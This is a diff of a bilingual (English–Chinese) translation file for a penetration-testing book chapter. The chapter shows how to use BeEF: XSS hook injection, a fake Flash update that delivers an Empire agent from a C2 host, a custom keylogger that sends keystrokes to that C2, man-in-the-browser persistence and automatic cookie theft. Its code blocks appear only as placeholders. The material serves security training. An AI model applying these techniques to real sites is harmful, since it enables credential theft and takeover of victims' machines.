+  zh: 如果我们可以访问应用程序的 shell，还可以通过 BeEF 钩子对应用程序代码进行后门操作。我们可以持久化我们的钩子代码并记录用户活动，甚至利用社会工程学在高价值目标的计算机上执行恶意软件。
 - en: 'The BeEF C2 panel is accessible via the URL displayed in the BeEF launcher
     output:'
+  id: totrans-183
   prefs: []
   type: TYPE_NORMAL
+  zh: BeEF C2 面板可以通过 BeEF 启动器输出中显示的 URL 进行访问：
 - en: '[PRE11]'
+  id: totrans-184
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE11]'
 - en: 'The user experience is a bit unorthodox but quick to get used to:'
+  id: totrans-185
   prefs: []
   type: TYPE_NORMAL
+  zh: 用户体验有点不太常规，但很快就能适应：
 - en: '![BeEF](graphics/B09238_09_10.jpg)'
+  id: totrans-186
   prefs: []
   type: TYPE_IMG
+  zh: '![BeEF](graphics/B09238_09_10.jpg)'
 - en: 'Figure 9.10: The BeEF C2 server control panel'
+  id: totrans-187
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 9.10：BeEF C2 服务器控制面板
 - en: On the left, the UI shows a history of hooked browsers or victims, both online
     and offline, grouped by the originating domain. An online victim can be exploited
     immediately, as the hook is actively calling back to the C2\. An offline browser
     has not recently checked in with the C2 but may still be exploited once the victim
     comes back online. This is typical with victims hooked via persistent XSS attacks,
     backdoored web applications, or browser extensions.
+  id: totrans-188
   prefs: []
   type: TYPE_NORMAL
 - en: On the right-hand side of the hooked browsers' history, you'll find the landing
     page (or **Getting Started**), the C2 server logs (**Logs**), and the selected
     victim's browser control tab (**Current Browser**). Of interest is the browser
     control, which includes sub-tabs for details, logs, and the modules, or commands.
+  id: totrans-189
   prefs: []
   type: TYPE_NORMAL
 - en: In the **Commands** tab, we can select a module to run, we can input any required
     parameters in the right-most column before hitting the **Execute** button, and
     we can observe the module's execution history in the center column.
+  id: totrans-190
   prefs: []
   type: TYPE_NORMAL
 - en: There are many modules available and some work better than others. The effectiveness
@@ -913,27 +1324,33 @@
     victim, and how technologically savvy they are. In the coming sections, we will
     look at the more successful attack modules in an attempt to compromise the target
     or harvest credentials.
+  id: totrans-191
   prefs: []
   type: TYPE_NORMAL
 - en: Hooking
+  id: totrans-192
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
 - en: 'With the BeEF C2 server running in the cloud, we have exposed two important
     URLs:'
+  id: totrans-193
   prefs: []
   type: TYPE_NORMAL
 - en: The administrative interface – `https://c2.spider.ml/ui/panel`
+  id: totrans-194
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
 - en: The hooking script – `https://c2.spider.ml/hook.js`
+  id: totrans-195
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
 - en: Both of the URLs are locked down by the `beef.restrictions.*` options in the
     configuration file. Take care to use the appropriate network ranges for hooking
     and admin UI restrictions.
+  id: totrans-196
   prefs: []
   type: TYPE_NORMAL
 - en: The `hook.js` file is essentially the malware we will drop in a victim's browser
@@ -941,53 +1358,66 @@
     code and it is best delivered as an external script (such as the one hosted on
     our C2), but this is not a requirement. We can copy and paste the whole hook code
     in the browser console window if we want to. It is large but portable.
+  id: totrans-197
   prefs: []
   type: TYPE_NORMAL
 - en: If we are trying to hide from the blue team, it may be best to move this file
     to something less conspicuous than `c2.spider.ml/hook.js`, but for the sake of
     this chapter, we will hook victims using this URL.
+  id: totrans-198
   prefs: []
   type: TYPE_NORMAL
 - en: 'As I alluded to earlier, once we have an XSS vulnerability, we can construct
     a payload to drop a new `script` tag, which will hook the client using the BeEF
     payload. In some situations, a bit more creativity may be required to get JavaScript
     to execute our code, but the end goal is to insert a payload similar to the following:'
+  id: totrans-199
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE12]'
+  id: totrans-200
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE12]'
 - en: 'In the common situation where the reflection point (also known as the **sink**)
     is located inside an HTML tag, we have a couple of options:'
+  id: totrans-201
   prefs: []
   type: TYPE_NORMAL
 - en: Close out the affected HTML tag and open a new `script` tag containing our hook
     code
+  id: totrans-202
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
 - en: Set up an event handler that will download and execute our hook code when an
     event happens, such as when the page loads or the user clicks an element
+  id: totrans-203
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
 - en: 'The first option is simple; we can close the `value` property with a double-quote
     and the `input` element with an angled bracket, followed by our malicious `script`
     tag:'
+  id: totrans-204
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE13]'
+  id: totrans-205
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE13]'
 - en: The resulting HTML code, once the XSS payload is reflected back, will silently
     download and execute our hook code, giving us access to the browsing session.
     The `async` keyword will ensure that the hook is downloaded asynchronously and
     does not slow down the page load, which could tip off the victim that something
     is amiss.
+  id: totrans-206
   prefs: []
   type: TYPE_NORMAL
 - en: The trailing unfinished `<span>` will ensure that the remainder of the original
     HTML code does not show up on the page, giving it a bit more of a clean look.
+  id: totrans-207
   prefs: []
   type: TYPE_NORMAL
 - en: 'If we have to use an event to execute our code, we can configure a handler
@@ -995,27 +1425,35 @@
     For example, if we wish to execute our hook when the user clicks the affected
     element, we can leverage the `<input>` tag''s `onclick` property, which allows
     us to execute arbitrary code:'
+  id: totrans-208
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE14]'
+  id: totrans-209
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE14]'
 - en: The preceding example will pop up an alert box containing the current cookies,
     which, as I've said before, is great for a proof of concept but not very useful
     in an attack.
+  id: totrans-210
   prefs: []
   type: TYPE_NORMAL
 - en: We can use the DOM and JavaScript to construct a net-new `script` element, point it to
     our hook code, and append it to the `head` of the page.
+  id: totrans-211
   prefs: []
   type: TYPE_NORMAL
 - en: 'Thanks to JavaScript''s flexibility, there are a million and one ways to accomplish
     this, but our code is fairly simple:'
+  id: totrans-212
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE15]'
+  id: totrans-213
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE15]'
 - en: The first line will create a blank object representing a `script` tag. Just
     as we did with the `src=` HTML tag property, in JavaScript, we can point the source
     of the script to our hook code. At this point, no actual code is downloaded or
@@ -1023,64 +1461,86 @@
     function to add it to the `document.head`, which is to say we create a `<script>`
     tag in the `<head>` tag of the page. The last line does just this, and the browser
     immediately and silently downloads the hook code and executes it.
+  id: totrans-214
   prefs: []
   type: TYPE_NORMAL
 - en: 'Our payload would look something like this:'
+  id: totrans-215
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE16]'
+  id: totrans-216
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE16]'
 - en: Again, the trailing `x="` property is to make sure there are no HTML parsing
     oddities and the code can execute cleanly.
+  id: totrans-217
   prefs: []
   type: TYPE_NORMAL
 - en: 'Another common sink for XSS vulnerabilities is directly inside JavaScript code,
     somewhere on the page itself:'
+  id: totrans-218
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE17]'
+  id: totrans-219
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE17]'
 - en: In the preceding example, the server would reflect some user-controlled text
     inside the `confirm()` string parameter. To take advantage of this, we can reuse
     the DOM manipulation code we wrote earlier and just adapt it to work inside a
     string passed to another function. This is by no means the only way to achieve
     code execution, but it's a start.
+  id: totrans-220
   prefs: []
   type: TYPE_NORMAL
 - en: 'With JavaScript, we can concatenate strings and other objects using the plus
     operator, as follows:'
+  id: totrans-221
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE18]'
+  id: totrans-222
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE18]'
 - en: The `prompt()` function will return whatever string value we give it, and `alert()`
     will concatenate the strings before returning to the user. We can do all kinds
     of strange things like that with JavaScript, but what's important to note is that
     a `prompt()` function was executed. If we have control of what is concatenated
     in a string, we can execute arbitrary JavaScript code.
+  id: totrans-223
   prefs: []
   type: TYPE_NORMAL
+  zh: '`prompt()`函数将返回我们提供的任何字符串值，而`alert()`则会在返回给用户之前连接这些字符串。我们可以用JavaScript做很多奇怪的事情，但需要注意的是，执行了`prompt()`函数。如果我们控制了字符串中的连接内容，就能执行任意的JavaScript代码。'
 - en: 'In the preceding code example, instead of returning our username, we will force
     the application to return a string concatenation, which will execute our dropper
     code:'
+  id: totrans-224
   prefs: []
   type: TYPE_NORMAL
+  zh: 在前面的代码示例中，我们将不再返回我们的用户名，而是强制应用返回一个字符串连接，这将执行我们的投放器代码：
 - en: '[PRE19]'
+  id: totrans-225
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE19]'
 - en: We're not really concerned with the end result of the concatenation, in fact,
     `eval` does not return anything meaningful for display. What we care about is the execution
     of `eval()`, which will in turn execute our hook dropper.
+  id: totrans-226
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们实际上并不关心连接的最终结果，实际上，`eval`并不会返回任何有意义的显示内容。我们关心的是`eval()`的执行，它将会执行我们的钩子投放器。
 - en: A keen eye will notice that there's a minor issue with this particular injection.
     If the user clicks OK in the confirm dialog box, the `sure` variable will be set
     to `true` and the page will navigate away, taking down our BeEF hook with it.
+  id: totrans-227
   prefs: []
   type: TYPE_NORMAL
+  zh: 眼尖的朋友会注意到，这种注入方式存在一个小问题。如果用户在确认对话框中点击“确定”，`sure`变量将被设置为`true`，页面将跳转离开，从而带走我们的BeEF钩子。
 - en: To get around this particular problem, we have to "complete" the script and
     control the script execution flow to make sure the page stays long enough for
     us to conduct our second stage of the attack. A sensible approach would be to
@@ -1088,80 +1548,112 @@
     to `false` immediately after. This will ensure that the page does not navigate
     away if the user clicks OK, as the next `if` condition will always evaluate to
     `false`.
+  id: totrans-228
   prefs: []
   type: TYPE_NORMAL
+  zh: 为了解决这个问题，我们必须“完成”脚本并控制脚本的执行流程，确保页面停留足够长的时间，以便我们进行攻击的第二阶段。一种合理的方法是关闭`confirm`函数，`eval`我们的代码，并立即将`sure`的值设置为`false`。这样可以确保即使用户点击“确定”，页面也不会跳转，因为下一个`if`条件将始终评估为`false`。
 - en: 'We have to modify our dropper payload slightly:'
+  id: totrans-229
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们需要稍微修改我们的投放器payload：
 - en: '[PRE20]'
+  id: totrans-230
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE20]'
 - en: 'The result is valid code that will prevent the `if` statement from evaluating
     to `true` and changing the document location. We use the double slash (`//`) to
     comment out the rest of the `confirm()` function, preventing JavaScript parse
     errors:'
+  id: totrans-231
   prefs: []
   type: TYPE_NORMAL
+  zh: 结果是有效的代码，它将防止`if`语句评估为`true`并更改文档位置。我们使用双斜杠（`//`）注释掉`confirm()`函数的其余部分，防止JavaScript解析错误：
 - en: '[PRE21]'
+  id: totrans-232
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE21]'
 - en: Injecting JavaScript code in the middle of a function can present some problems
     if it is not carefully crafted. HTML is fairly forgiving if we miss a closing
     tag or break the rest of the page. Some JavaScript engines, however, will fail
     to parse the code and our payload will never execute.
+  id: totrans-233
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果不小心构造，在函数中间注入JavaScript代码可能会出现一些问题。如果我们漏掉关闭标签或破坏了页面的其他部分，HTML是相对宽容的。但是，有些JavaScript引擎将无法解析代码，我们的payload将无法执行。
 - en: 'For the following BeEF scenarios, we will hook the badguys site, available
     at `http://badguys.local`, using the following XSS attack. This is a much simpler
     reflected XSS attack, but it should do the trick to showcase BeEF capabilities:'
+  id: totrans-234
   prefs: []
   type: TYPE_NORMAL
+  zh: 在接下来的BeEF场景中，我们将使用以下XSS攻击钩取坏人的站点，站点地址为`http://badguys.local`。这是一种更简单的反射型XSS攻击，但它应该足以展示BeEF的能力：
 - en: '[PRE22]'
+  id: totrans-235
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE22]'
 - en: The `qs` parameter is vulnerable to reflected XSS attacks and we will target
     victims with our BeEF hook.
+  id: totrans-236
   prefs: []
   type: TYPE_NORMAL
+  zh: '`qs`参数易受反射型XSS攻击，我们将用我们的BeEF钩子攻击目标。'
 - en: 'If successful, the BeEF C2 server log will show the new hooked browser, the
     IP address, the browser, the OS, and the domain on which the XSS payload executed:'
+  id: totrans-237
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果成功，BeEF C2服务器日志将显示新的被钩取浏览器、IP地址、浏览器、操作系统以及XSS payload执行的域名：
 - en: '[PRE23]'
+  id: totrans-238
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE23]'
 - en: We can now begin executing various commands (or modules) on the victim's browser.
+  id: totrans-239
   prefs: []
   type: TYPE_NORMAL
+  zh: 现在我们可以开始在受害者的浏览器上执行各种命令（或模块）。
 - en: Social engineering attacks
+  id: totrans-240
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 社会工程学攻击
 - en: By far the easiest way to capture credentials or to execute malicious code is,
     and always will be, social engineering. XSS attacks, in particular, give us the
     advantage of executing code on a user-trusted website, dramatically increasing
     the chance of success, since even the most vigilant user will trust a web address
     they recognize.
+  id: totrans-241
   prefs: []
   type: TYPE_NORMAL
 - en: 'BeEF provides us with several social engineering modules, including but not
     limited to:'
+  id: totrans-242
   prefs: []
   type: TYPE_NORMAL
 - en: '**Fake Notification Bar**: Delivers malware by imitating browser notification
     bars'
+  id: totrans-243
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
 - en: '**Fake Flash Update**: Delivers malware disguised as a Flash update popup'
+  id: totrans-244
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
 - en: '**Pretty Theft**: Captures credentials using fake popups for familiar sites'
+  id: totrans-245
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
 - en: '**Fake LastPass**: Captures LastPass credentials using a fake popup'
+  id: totrans-246
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
@@ -1169,25 +1661,31 @@
     Flash Update module, located under **Commands** in the **Social Engineering**
     category. This technique is still surprisingly effective in the wild, and BeEF
     simplifies the delivery of an executable payload to the victim.
+  id: totrans-247
   prefs: []
   type: TYPE_NORMAL
 - en: 'The configuration is simple; we just need to point the module to our very own
     custom payload, which will be presented to the victim as a fake Flash update file:'
+  id: totrans-248
   prefs: []
   type: TYPE_NORMAL
 - en: '![Social engineering attacks](graphics/B09238_09_11.jpg)'
+  id: totrans-249
   prefs: []
   type: TYPE_IMG
 - en: 'Figure 9.11: Configuring the Fake Flash Update BeEF command'
+  id: totrans-250
   prefs: []
   type: TYPE_NORMAL
 - en: We can also specify a custom image if we wish to change the default one hosted
     on the BeEF server. Our "Fake Flash" payload (`FlashUpdate.bat`) is a simple batch
     script, which will execute a PowerShell **Empire** agent malware. We have a separate
     Empire C2 server running in the cloud as well, waiting for the agent to check-in.
+  id: totrans-251
   prefs: []
   type: TYPE_NORMAL
 - en: Note
+  id: totrans-252
   prefs:
   - PREF_H3
   type: TYPE_NORMAL
@@ -1197,6 +1695,7 @@
     access trojan** (**RAT**). Linux is also supported via a Python agent. There are
     a ton of post-exploitation modules and Empire is easily deployed in the cloud.
     More information can be found at [https://www.powershellempire.com/](https://www.powershellempire.com/).
+  id: totrans-253
   prefs: []
   type: TYPE_NORMAL
 - en: We have hosted the Empire agent downloader (`FlashUpdate.bat`) on our C2 server
@@ -1204,50 +1703,65 @@
     with an image that looks like a prompt to update Flash. Clicking anywhere on the
     image will begin the download of the malware. The user will still have to execute
     it, but as I've mentioned before, this is still a very effective method for exploitation.
+  id: totrans-254
   prefs: []
   type: TYPE_NORMAL
 - en: 'Clicking **Execute** in the Fake Flash Update command will popup the fake message
     in the victim''s browser:'
+  id: totrans-255
   prefs: []
   type: TYPE_NORMAL
 - en: '![Social engineering attacks](graphics/B09238_09_12.jpg)'
+  id: totrans-256
   prefs: []
   type: TYPE_IMG
 - en: 'Figure 9.12: The Fake Flash Update command in action'
+  id: totrans-257
   prefs: []
   type: TYPE_NORMAL
 - en: Note
+  id: totrans-258
   prefs:
   - PREF_H3
   type: TYPE_NORMAL
 - en: Hovering over the image will show the `http://c2.spider.ml/FlashUpdate.bat`
     link that we configured earlier in the Fake Flash Update command.
+  id: totrans-259
   prefs: []
   type: TYPE_NORMAL
 - en: 'The Empire C2 server receives the agent connection, giving us full control
     over the victim''s machine, not just the browser:'
+  id: totrans-260
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE24]'
+  id: totrans-261
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE24]'
 - en: 'We can interact with the agent and execute arbitrary commands (among many,
     many other things):'
+  id: totrans-262
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE25]'
+  id: totrans-263
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE25]'
 - en: With a little help from the XSS attack, we were able to trick our victim into
     executing our malware and letting us escalate privileges from in-browser to having
     full control over the victim's machine.
+  id: totrans-264
   prefs: []
   type: TYPE_NORMAL
 - en: There are other social engineering modules available and the majority have a
     fairly high rate of success.
+  id: totrans-265
   prefs: []
   type: TYPE_NORMAL
 - en: The keylogger
+  id: totrans-266
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
@@ -1255,177 +1769,228 @@
     us to capture keystrokes very easily, and since we have access to execute arbitrary
     JavaScript code in the browser, we can set up a keystroke logger as well. You
     can imagine that XSS in a login page could be very valuable to attackers.
+  id: totrans-267
   prefs: []
   type: TYPE_NORMAL
 - en: There is no module or command within BeEF to enable a keylogger because it is
     enabled by default in the core! We can see the keystrokes entered by each hooked
     browser by inspecting either the **Logs** tab next to the **Current Browser**
     tab in the web user interface, or by looking at the C2 console output directly.
+  id: totrans-268
   prefs: []
   type: TYPE_NORMAL
 - en: 'To see the BeEF keylogger in action, we have to start the server using the
     `-v` (verbose) switch:'
+  id: totrans-269
   prefs: []
   type: TYPE_NORMAL
 - en: '![The keylogger](graphics/B09238_09_13.jpg)'
+  id: totrans-270
   prefs: []
   type: TYPE_IMG
 - en: 'Figure 9.13: BeEF running in the cloud in verbose mode'
+  id: totrans-271
   prefs: []
   type: TYPE_NORMAL
 - en: 'There is a ton of output relating to the initialization of BeEF, which can
     be safely ignored. After the victim''s browser is hooked, however, user events
     will be sent to the BeEF C2, including keystrokes and mouse clicks:'
+  id: totrans-272
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE26]'
+  id: totrans-273
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE26]'
 - en: We can see what looks like credentials typed into the hooked application. The
     words will be split up because of the frequency with which the BeEF hook calls
     home and submits the captured key buffer. In most cases, it is fairly obvious
     what the user is typing in.
+  id: totrans-274
   prefs: []
   type: TYPE_NORMAL
 - en: The built-in keylogger is fairly good and most attacks will benefit from it.
     However, in certain situations, a more custom keylogger may be required. Perhaps
     we want to send the keys to some other location, or just want to record more keystrokes,
     such as *Backspace*, *Enter*, and *Tab*.
+  id: totrans-275
   prefs: []
   type: TYPE_NORMAL
 - en: Using BeEF as an attack tool is possible because XSS allows us to execute JavaScript
     code in the browser. All the commands we send are just snippets of code executing
     as if they were part of the application.
+  id: totrans-276
   prefs: []
   type: TYPE_NORMAL
 - en: As expected, there is a BeEF command that we can use to execute any JavaScript
     we want in the hooked browser. Our custom keylogger is not very advanced but allows
     us to customize it to fit our needs in the future.
+  id: totrans-277
   prefs: []
   type: TYPE_NORMAL
 - en: 'The first thing we will do is define a `push_url` variable, which is the C2
     server URL to which we will submit captured keystrokes. This server component
     will decode the keylogger information and store it in a text file for review:'
+  id: totrans-278
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE27]'
+  id: totrans-279
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE27]'
 - en: 'Next, we will use the `document.addEventListener()` method to fire a handler
     function whenever a `keydown` event occurs somewhere on the page. This event indicates
     that the user has pressed down on a key and gives us an opportunity to programmatically
     inspect and record it. Keys will be appended to a buffer variable, which will
     be later sent to the `push_url`:'
+  id: totrans-280
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE28]'
+  id: totrans-281
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE28]'
 - en: 'When this event does fire, we store the pressed key inside a buffer to be later
     submitted to the keylogging server. The `if` statement within this `keydown` handler
     function will wrap special keys with brackets to make it easier for us to read.
     For example: the keystrokes *Enter*, *Space*, and *Tab* would be recorded as `[Enter]`,
     `[Space]`, `[Tab]`, respectively.'
+  id: totrans-282
   prefs: []
   type: TYPE_NORMAL
 - en: 'The last bit of code will execute a function every couple of seconds (every
     2,000 milliseconds) and is responsible for submitting the current buffer to the
     defined `push_url`:'
+  id: totrans-283
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE29]'
+  id: totrans-284
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE29]'
 - en: The `window.setInterval()` function allows us to specify another function that
     will be executed periodically, in parallel to the `keydown` handler. As the `keydown`
     handler fills the buffer, the `setInterval()` function sends it up to the C2 server.
+  id: totrans-285
   prefs: []
   type: TYPE_NORMAL
 - en: 'The keylogger submission process is as follows:'
+  id: totrans-286
   prefs: []
   type: TYPE_NORMAL
 - en: Convert the buffer from an array to a string using `.join()`
+  id: totrans-287
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: Encode the result to Base64 using `btoa()`
+  id: totrans-288
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: URI encode the Base64 value with `encodeURIComponent` and store the result in
     the data
+  id: totrans-289
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: Create a new `Image()` object and set its source to the `push_url` with the
     encoded data appended to the end
+  id: totrans-290
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: The neat side effect of creating a new `Image()` object is that no actual image
     is created on the page, but once a source (`.src`) is defined, the browser will
     attempt to fetch it over the wire, sending out the encoded buffer via the URL.
+  id: totrans-291
   prefs: []
   type: TYPE_NORMAL
 - en: 'The full keylogger client-side code is as follows:'
+  id: totrans-292
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE30]'
+  id: totrans-293
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE30]'
 - en: To complete this keylogger, we need the server component to intercept the submission,
     and decode and store the logged keystrokes.
+  id: totrans-294
   prefs: []
   type: TYPE_NORMAL
 - en: 'We can write a little bit of PHP to do just that:'
+  id: totrans-295
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE31]'
+  id: totrans-296
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE31]'
 - en: The first line is an `if` statement, which checks to see whether any data came
     in via the session `GET` parameter. If there is data available, the script will
     decode it and store it in the `$keys` variable to be written to disk in the `keys.log`
     file using the `fwrite()` function.
+  id: totrans-297
   prefs: []
   type: TYPE_NORMAL
 - en: 'We can start the built-in PHP server on port `80` to serve the `log.php` file
     for our JavaScript keylogger to communicate with:'
+  id: totrans-298
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE32]'
+  id: totrans-299
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE32]'
 - en: 'All that''s left is to push the JavaScript payload through BeEF to our hooked
     target using the Raw JavaScript command under the **Misc** node:'
+  id: totrans-300
   prefs: []
   type: TYPE_NORMAL
 - en: '![The keylogger](graphics/B09238_09_14.jpg)'
+  id: totrans-301
   prefs: []
   type: TYPE_IMG
 - en: 'Figure 9.14: Executing the custom keylogger on the hooked victim'
+  id: totrans-302
   prefs: []
   type: TYPE_NORMAL
 - en: 'Once the user starts typing, we can see the requests coming into our server:'
+  id: totrans-303
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE33]'
+  id: totrans-304
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE33]'
 - en: 'If we view the contents of `keys.log`, we will see the captured keystrokes
     in cleartext using the `tail -f` command:'
+  id: totrans-305
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE34]'
+  id: totrans-306
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE34]'
 - en: Our keylogger is effective and should work fairly well on modern browsers. BeEF's
     built-in event logger has a few other nice features, such as capturing mouse clicks,
     and copy-and-paste events, as well as traditional keystrokes. Using both in an
     attack may improve our chances of capturing useful data.
+  id: totrans-307
   prefs: []
   type: TYPE_NORMAL
 - en: Persistence
+  id: totrans-308
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
@@ -1434,21 +1999,26 @@
     away from the page can interrupt our control over their browser. This is the unfortunate
     reality of XSS attacks. Persistent XSS is more resilient, provided the user visits
     the infected page often enough, but this is not ideal.
+  id: totrans-309
   prefs: []
   type: TYPE_NORMAL
 - en: 'BeEF comes with a few modules to attempt to persist the hook, keeping the victim
     online longer. An effective option is the Man-In-The-Browser command, available
     under the **Persistence** node:'
+  id: totrans-310
   prefs: []
   type: TYPE_NORMAL
 - en: '![Persistence](graphics/B09238_09_15.jpg)'
+  id: totrans-311
   prefs: []
   type: TYPE_IMG
 - en: 'Figure 9.15: The Man-In-The-Browser command'
+  id: totrans-312
   prefs: []
   type: TYPE_NORMAL
 - en: There are no options to set for this one; we just have to execute and everything
     is taken care of.
+  id: totrans-313
   prefs: []
   type: TYPE_NORMAL
 - en: The **man-in-the-browser** (**MITB**) attack is similar to the more popular
@@ -1458,46 +2028,57 @@
     attacks such as TLS downgrade or stripping, integrity violation, malware injection,
     and much more. An MITB attack is similar in that web requests are intercepted
     and proxied by attacker code.
+  id: totrans-314
   prefs: []
   type: TYPE_NORMAL
 - en: 'BeEF''s Man-In-The-Browser module, for example, will intercept link clicks
     that would normally navigate the user away from the hooked page. Instead of allowing
     the click to complete normally, the module will perform the following steps in
     the background:'
+  id: totrans-315
   prefs: []
   type: TYPE_NORMAL
 - en: Execute an asynchronous JavaScript request (XHR) to the intended destination
+  id: totrans-316
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: Replace the existing page's contents with the destination page's contents
+  id: totrans-317
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: Update the address bar to reflect the clicked link
+  id: totrans-318
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: Add the "old" page to the browsing history
+  id: totrans-319
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: 'We can see the MITB attack in action by looking at the command execution history:'
+  id: totrans-320
   prefs: []
   type: TYPE_NORMAL
 - en: '![Persistence](graphics/B09238_09_16.jpg)'
+  id: totrans-321
   prefs: []
   type: TYPE_IMG
 - en: 'Figure 9.16: Man-In-The-Browser command results'
+  id: totrans-322
   prefs: []
   type: TYPE_NORMAL
 - en: To the victim, this process is transparent, as the page they have requested
     was loaded successfully and everything looks normal. The difference is that BeEF
     never lost control of the hook, since the tab session was not discarded by navigating
     away. The BeEF hook is still running, giving us persistent control.
+  id: totrans-323
   prefs: []
   type: TYPE_NORMAL
 - en: Automatic exploitation
+  id: totrans-324
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
@@ -1505,6 +2086,7 @@
     we successfully trick the user into executing our BeEF hook, we may not have enough
     time to click through the user interface and run any modules before they close
     the page or browse to some other part of the application.
+  id: totrans-325
   prefs: []
   type: TYPE_NORMAL
 - en: 'Thankfully, BeEF implements an **Autorun Rule Engine** (**ARE**) that does
@@ -1513,42 +2095,53 @@
     is infected with the hook payload, the selected modules are automatically executed.
     The obvious candidates for ARE are the ones that provide persistence and exfiltrate
     sensitive data, such as cookies or even our custom keylogger.'
+  id: totrans-326
   prefs: []
   type: TYPE_NORMAL
 - en: Note
+  id: totrans-327
   prefs:
   - PREF_H3
   type: TYPE_NORMAL
 - en: More information on ARE can be found at [https://github.com/beefproject/beef/wiki/Autorun-Rule-Engine](https://github.com/beefproject/beef/wiki/Autorun-Rule-Engine).
+  id: totrans-328
   prefs: []
   type: TYPE_NORMAL
 - en: An ARE rule is a simple JSON file with metadata describing the module that is
     to be executed, stored in BeEF's `arerules` subdirectory.
+  id: totrans-329
   prefs: []
   type: TYPE_NORMAL
 - en: BeEF comes with a few sample rules that allow you to execute modules such as
     Get Cookie or Ping Sweep, but they are not turned on by default. If we wish to
     execute them as soon as the victim is hooked, we have to place the respective
     JSON files inside the `arerules/enabled` subdirectory and restart BeEF.
+  id: totrans-330
   prefs: []
   type: TYPE_NORMAL
 - en: 'The Get Cookie ARE rule looks like this:'
+  id: totrans-331
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE35]'
+  id: totrans-332
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE35]'
 - en: There's some metadata, such as `name` and `author`. The ARE rule can also specify
     any associated options it may need to execute successfully. We can define an execution
     order and also add a delay. The rule chaining modes refers to the method used
     to run the module, but the default sequence should work just fine in most deployments.
+  id: totrans-333
   prefs: []
   type: TYPE_NORMAL
 - en: Note
+  id: totrans-334
   prefs:
   - PREF_H3
   type: TYPE_NORMAL
 - en: More information on chaining modes and writing ARE can be found at [https://github.com/beefproject/beef/wiki/Autorun-Rule-Engine](https://github.com/beefproject/beef/wiki/Autorun-Rule-Engine).
+  id: totrans-335
   prefs: []
   type: TYPE_NORMAL
 - en: In our scenario, we are executing our hook using a reflected XSS attack, which
@@ -1556,45 +2149,58 @@
     This is where ARE comes in handy. We can automatically execute the Man-In-The-Browser
     and Get Cookie modules as soon as the victim comes online and hope that we can
     persist, or at least get the session cookie, before they leave.
+  id: totrans-336
   prefs: []
   type: TYPE_NORMAL
 - en: 'Man-In-The-Browser and Get Cookie both have rules already available in BeEF;
     we just have to enable them by placing a copy of the proper JSON files in the
     `arerules/enabled` subdirectory:'
+  id: totrans-337
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE36]'
+  id: totrans-338
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE36]'
 - en: 'For the ARE to load the newly enabled rules, we''d have to restart BeEF if
     it is already running:'
+  id: totrans-339
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE37]'
+  id: totrans-340
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE37]'
 - en: BeEF will perform an MITB attack and extract the application cookies as soon
